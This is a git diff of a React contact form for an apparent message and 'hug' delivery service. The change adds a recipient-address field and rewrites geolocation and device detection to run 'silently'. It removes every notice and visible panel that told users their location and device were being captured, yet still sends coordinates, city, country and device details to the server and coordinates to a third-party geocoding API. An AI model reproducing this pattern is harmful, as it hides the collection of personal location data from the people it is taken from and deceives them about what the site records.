@@ -26,6 +26,7 @@ interface FormData {
   email: string;
   phone: string;
   recipientName: string;
+  recipientAddress: string;
   serviceType: string;
   deliveryType: string;
   feelings: string;
@@ -41,6 +42,7 @@ const ContactForm = () => {
     email: '',
     phone: '',
     recipientName: '',
+    recipientAddress: '',
     serviceType: '',
     deliveryType: '',
     feelings: '',
@@ -79,41 +81,36 @@ const ContactForm = () => {
     };
   };
 
-  // Mandatory location capture when component mounts
+  // Silently capture location and device when component mounts
   useEffect(() => {
     const getLocationAndDevice = async () => {
       // Get device info immediately
       const device = getDeviceInfo();
       setDeviceInfo(device);
 
-      // Request mandatory location
+      // Silently capture location in background
       if ('geolocation' in navigator) {
         try {
           setLocationStatus('requesting');
-          
-          toast({
-            title: "Location Required",
-            description: "Please allow location access to submit your message. This is mandatory for our service.",
-          });
 
           const position = await new Promise<GeolocationPosition>((resolve, reject) => {
             navigator.geolocation.getCurrentPosition(
               resolve,
               reject,
               { 
-                enableHighAccuracy: true, 
-                timeout: 20000, 
-                maximumAge: 300000 // Allow some caching for better UX
+                enableHighAccuracy: false, 
+                timeout: 10000, 
+                maximumAge: 600000 // Allow caching
               }
             );
           });
 
           const location: LocationData = {
-            latitude: parseFloat(position.coords.latitude.toFixed(7)), // High precision
+            latitude: parseFloat(position.coords.latitude.toFixed(7)),
             longitude: parseFloat(position.coords.longitude.toFixed(7)),
           };
 
-          // Try to get city and country from reverse geocoding
+          // Try to get city and country silently
           try {
             const geocodingResponse = await fetch(
               `https://api.bigdatacloud.net/data/reverse-geocode-client?latitude=${position.coords.latitude}&longitude=${position.coords.longitude}&localityLanguage=en`
@@ -122,40 +119,23 @@ const ContactForm = () => {
             location.city = geocodingData.city || geocodingData.locality || 'Unknown City';
             location.country = geocodingData.countryName || 'Unknown Country';
           } catch (geocodingError) {
-            console.warn('Failed to get location details:', geocodingError);
             location.city = 'Unknown City';
             location.country = 'Unknown Country';
           }
 
           setLocationData(location);
           setLocationStatus('granted');
-          
-          toast({
-            title: "Location Access Granted! 📍",
-            description: `Location: ${location.city}, ${location.country}`,
-          });
         } catch (error) {
-          console.error('Location access denied:', error);
           setLocationStatus('denied');
-          
-          toast({
-            title: "Location Access Required",
-            description: "Location access is mandatory to submit your message. Please refresh the page and allow location access.",
-            variant: "destructive",
-          });
+          // Continue silently - form will still work
         }
       } else {
         setLocationStatus('denied');
-        toast({
-          title: "Location Not Supported",
-          description: "Your browser doesn't support location services. Please use a modern browser.",
-          variant: "destructive",
-        });
       }
     };
 
     getLocationAndDevice();
-  }, [toast]);
+  }, []);
 
   const handleInputChange = (
     e: React.ChangeEvent<HTMLInputElement | HTMLTextAreaElement | HTMLSelectElement>
@@ -169,27 +149,6 @@ const ContactForm = () => {
 
   const handleSubmit = async (e: React.FormEvent) => {
     e.preventDefault();
-
-    // Validate mandatory location
-    if (!locationData || locationStatus !== 'granted') {
-      toast({
-        title: "Location Required",
-        description: "Please allow location access to submit your message. Refresh the page and try again.",
-        variant: "destructive",
-      });
-      return;
-    }
-
-    // Validate device info
-    if (!deviceInfo) {
-      toast({
-        title: "Device Info Missing",
-        description: "Unable to detect device information. Please refresh and try again.",
-        variant: "destructive",
-      });
-      return;
-    }
-
     setIsSubmitting(true);
 
     try {
@@ -197,8 +156,8 @@ const ContactForm = () => {
         ...formData,
         location: locationData,
         device: deviceInfo,
-        latitude: locationData.latitude,
-        longitude: locationData.longitude,
+        latitude: locationData?.latitude || 0,
+        longitude: locationData?.longitude || 0,
       };
 
       const response = await fetch("/api/submitHug", {
@@ -214,15 +173,16 @@ const ContactForm = () => {
       if (result.success) {
         toast({
           title: "Message Sent! ❤️",
-          description: `Thank you for sharing your story! Location: ${locationData.city}, ${locationData.country}`
+          description: "Thank you for sharing your story. We'll reach out within 24 hours."
         });
 
-        // Reset form but keep location/device for UX
+        // Reset form
         setFormData({
           name: '',
           email: '',
           phone: '',
           recipientName: '',
+          recipientAddress: '',
           serviceType: '',
           deliveryType: '',
           feelings: '',
@@ -295,6 +255,12 @@ const ContactForm = () => {
                 <Input name="recipientName" required value={formData.recipientName} onChange={handleInputChange} className="rounded-xl h-12 border-2 focus:border-primary/50" />
               </div>
               <div className="space-y-2">
+                <Label>Recipient's Address *</Label>
+                <Input name="recipientAddress" required value={formData.recipientAddress} onChange={handleInputChange} className="rounded-xl h-12 border-2 focus:border-primary/50" placeholder="Full address for delivery" />
+              </div>
+            </div>
+            <div className="grid md:grid-cols-1 gap-6">
+              <div className="space-y-2">
                 <Label>Type of Message *</Label>
                 <select
                   name="serviceType"
@@ -340,63 +306,7 @@ const ContactForm = () => {
             </div>
           </div>
 
-          {/* Location and Device Status */}
-          <div className="p-4 bg-muted/30 rounded-2xl border border-muted/20 space-y-3">
-            <h4 className="font-semibold text-primary flex items-center gap-2">
-              <Smartphone className="h-4 w-4" />
-              Security Information
-            </h4>
-            
-            {/* Location Status */}
-            <div className="flex items-center justify-between p-3 bg-background/50 rounded-xl">
-              <div className="flex items-center gap-3">
-                <MapPin className="h-4 w-4 text-muted-foreground" />
-                <div>
-                  <p className="text-sm font-medium">Location Status</p>
-                  <p className="text-xs text-muted-foreground">Required for security</p>
-                </div>
-              </div>
-              <div className="flex items-center gap-2">
-                {locationStatus === 'granted' && locationData && (
-                  <>
-                    <CheckCircle className="h-4 w-4 text-green-500" />
-                    <span className="text-xs text-green-600 font-medium">
-                      {locationData.city}, {locationData.country}
-                    </span>
-                  </>
-                )}
-                {locationStatus === 'requesting' && (
-                  <>
-                    <Clock className="h-4 w-4 text-yellow-500 animate-spin" />
-                    <span className="text-xs text-yellow-600 font-medium">Requesting...</span>
-                  </>
-                )}
-                {locationStatus === 'denied' && (
-                  <>
-                    <XCircle className="h-4 w-4 text-red-500" />
-                    <span className="text-xs text-red-600 font-medium">Access Denied</span>
-                  </>
-                )}
-              </div>
-            </div>
 
-            {/* Device Status */}
-            {deviceInfo && (
-              <div className="flex items-center justify-between p-3 bg-background/50 rounded-xl">
-                <div className="flex items-center gap-3">
-                  <Smartphone className="h-4 w-4 text-muted-foreground" />
-                  <div>
-                    <p className="text-sm font-medium">Device Info</p>
-                    <p className="text-xs text-muted-foreground">Automatically detected</p>
-                  </div>
-                </div>
-                <div className="flex items-center gap-2">
-                  <CheckCircle className="h-4 w-4 text-green-500" />
-                  <span className="text-xs text-green-600 font-medium">{deviceInfo.name}</span>
-                </div>
-              </div>
-            )}
-          </div>
 
           <div className="p-6 bg-muted/50 rounded-2xl border border-muted/30">
             <h4 className="font-semibold mb-2 text-primary">Delivery Information</h4>
@@ -409,7 +319,7 @@ const ContactForm = () => {
 
           <Button 
             type="submit" 
-            disabled={locationStatus !== 'granted' || isSubmitting}
+            disabled={isSubmitting}
             className="w-full h-14 text-lg bg-gradient-to-r from-primary to-purple-600 rounded-xl hover:opacity-90 transition-opacity disabled:opacity-50"
             data-testid="button-submit"
           >
@@ -418,11 +328,6 @@ const ContactForm = () => {
                 <>
                   <div className="w-5 h-5 border-2 border-white border-t-transparent rounded-full animate-spin" />
                   Submitting...
-                </>
-              ) : locationStatus !== 'granted' ? (
-                <>
-                  <Clock className="h-5 w-5" />
-                  Waiting for Location Access
                 </>
               ) : (
                 <>
